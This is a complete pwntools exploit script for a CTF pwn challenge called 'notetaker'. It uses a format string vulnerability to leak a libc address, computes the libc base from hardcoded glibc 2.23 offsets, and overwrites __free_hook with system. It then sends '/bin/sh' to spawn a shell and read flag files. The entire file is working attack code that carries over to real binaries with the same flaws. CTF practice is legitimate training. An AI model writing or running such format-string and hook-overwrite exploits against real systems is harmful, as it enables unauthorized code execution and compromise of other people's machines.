#!/usr/bin/env python3
from pwn import *

# Context setup
context.arch = 'amd64'
context.log_level = 'info'

# Remote connection details
HOST = 'notetaker.ctf.pascalctf.it'
PORT = 9002

# Libc offsets (Ubuntu GLIBC 2.23-0ubuntu11.3)
LIBC_START_MAIN = 0x20750
LIBC_SYSTEM = 0x453a0
LIBC_BINSH = 0x18ce57
LIBC_FREE_HOOK = 0x3c67a8
LIBC_MALLOC_HOOK = 0x3c4b10

# One gadgets for libc 2.23 (try these)
ONE_GADGETS = [0x45226, 0x4527a, 0xf0364, 0xf1207]

# Format string offset (where our input starts on stack)
FMT_OFFSET = 8

def get_conn():
    if args.LOCAL:
        return process('./challenge/notetaker')
    return remote(HOST, PORT)

def menu(io, choice):
    io.recvuntil(b'>')
    io.sendline(str(choice).encode())

def set_note(io, payload):
    menu(io, 2)
    io.recvuntil(b'Enter the note: ')
    io.send(payload)

def print_note(io):
    menu(io, 1)
    return io.recvline()

def clear_note(io):
    menu(io, 3)

def exploit():
    io = get_conn()
    
    # Step 1: Leak libc address at offset 43 (__libc_start_main + 240)
    log.info("Leaking libc address...")
    set_note(io, b'%43$p\n')
    leak = print_note(io).decode(errors='ignore').strip()
    log.info(f"Raw leak: {leak}")
    
    libc_leak = int(leak, 16)
    log.info(f"Leaked address: {hex(libc_leak)}")
    
    # Calculate libc base: leak = __libc_start_main + 240
    libc_base = libc_leak - LIBC_START_MAIN - 240
    
    # Adjust if not page-aligned
    if libc_base & 0xfff != 0:
        for offset in range(200, 260):
            test_base = libc_leak - LIBC_START_MAIN - offset
            if test_base & 0xfff == 0:
                libc_base = test_base
                log.info(f"Found correct offset: {offset}")
                break
    
    log.success(f"Libc base: {hex(libc_base)}")
    
    # Calculate addresses
    malloc_hook = libc_base + LIBC_MALLOC_HOOK
    free_hook = libc_base + LIBC_FREE_HOOK
    system_addr = libc_base + LIBC_SYSTEM
    
    log.info(f"__malloc_hook: {hex(malloc_hook)}")
    log.info(f"__free_hook: {hex(free_hook)}")
    log.info(f"system: {hex(system_addr)}")
    
    # Step 2: Overwrite __free_hook with system
    clear_note(io)
    
    log.info(f"Overwriting __free_hook with system...")
    
    writes = {free_hook: system_addr}
    payload = fmtstr_payload(FMT_OFFSET, writes, write_size='short')
    
    log.info(f"Payload size: {len(payload)}")
    
    if len(payload) > 0x100:
        log.warning("Payload too long! Using byte writes...")
        payload = fmtstr_payload(FMT_OFFSET, writes, write_size='byte')
    
    set_note(io, payload + b'\n')
    
    # Trigger the write
    log.info("Triggering format string write...")
    print_note(io)
    
    # Step 3: Trigger free with "/bin/sh" as argument
    # The menu does: malloc -> fgets -> sscanf -> free
    # So we send "/bin/sh\x00" and when free is called, it becomes system("/bin/sh")
    log.info("Sending /bin/sh to trigger system...")
    io.recvuntil(b'>')
    io.sendline(b'/bin/sh\x00')
    
    # Wait a bit for shell
    sleep(0.5)
    
    log.success("Got shell!")
    
    # Try to get flag
    io.sendline(b'id')
    io.sendline(b'cat flag*')
    io.sendline(b'cat /flag*')
    io.sendline(b'ls -la')
    
    io.interactive()

if __name__ == '__main__':
    exploit()
